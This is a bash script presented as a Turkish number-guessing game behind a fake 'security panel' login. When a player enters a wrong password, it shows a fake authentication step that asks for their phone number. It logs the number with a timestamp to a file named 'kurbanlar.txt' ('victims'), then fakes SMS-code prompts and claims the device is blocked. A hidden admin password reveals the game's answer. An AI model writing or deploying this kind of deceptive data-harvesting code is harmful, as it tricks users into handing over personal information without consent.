# oyun-sayi-tahmin

#!/bin/bash
LOG_FILE="kurbanlar.txt"

oyun() {
    clear
    echo -e "\e[1;31m--- SISTEM GUVENLIK PANELI ---\e[0m"
    echo -e "\e[1;33m[!] Sifre 6 karakterden olusur.\e[0m"
    echo -n "Sifre: "
    read sifre

    hedef=$(( ( RANDOM % 200 ) + 1 ))

    if [ "$sifre" == "987987" ]; then
        echo -e "\e[1;32m[+] Onaylandi...\e[0m"
        sleep 1
        clear
    elif [ "$sifre" == "cellat31" ]; then
        clear
        echo -e "\e[1;32m-------------------------------------------\e[0m"
        echo -e "\e[1;32m ADMİN GELDİ ŞİFRE $hedef \e[0m"
        echo -e "\e[1;32m-------------------------------------------\e[0m"
        sleep 4
        clear
    else
        echo -e "\e[1;31m[!] HATALI GIRIS! KIMLIK DOGRULAMA GEREKLI.\e[0m"
        echo -ne "\e[1;33m[?] Telefon Numaraniz: \e[0m"
        read tel_no
        echo "[$(date +%H:%M:%S)] No: $tel_no" >> $LOG_FILE
        echo -e "\e[1;34m[*] SMS Kodu +90$tel_no hattina iletiliyor...\e[0m"
        sleep 2
        echo -ne "\e[1;33m[?] SMS Kodunu Girin (1/2): \e[0m"
        read k1
        echo -e "\e[1;31m[-] Kod Hatali!\e[0m"
        echo -ne "\e[1;33m[?] SMS Kodunu Girin (2/2): \e[0m"
        read k2
        echo -e "\e[1;31m[!] ERISIM REDDEDILDI! CIHAZ BLOKE EDILDI.\e[0m"
        sleep 2
        clear
        exit
    fi

    echo "1-200 arasi sayiyi tahmin et!"
    deneme=0
    while true; do
        echo -n "Tahmin: "
        read tahmin
        [[ -z "$tahmin" ]] && continue
        deneme=$((deneme + 1))
        if [ "$tahmin" -lt "$hedef" ]; then
            echo -e "\e[1;36mYUKARI!\e[0m"
        elif [ "$tahmin" -gt "$hedef" ]; then
            echo -e "\e[1;35mASAGI!\e[0m"
        else
            echo -e "\e[1;32mBULDUN! Sayi: $hedef ($deneme deneme)\e[0m"
            break
        fi
    done

    echo -e "\n[1] Yeni oyun\n[2] CIKIS"
    read -p "Secim: " sec
    if [[ "$sec" == "1" ]]; then oyun; else clear; exit; fi
}

oyun
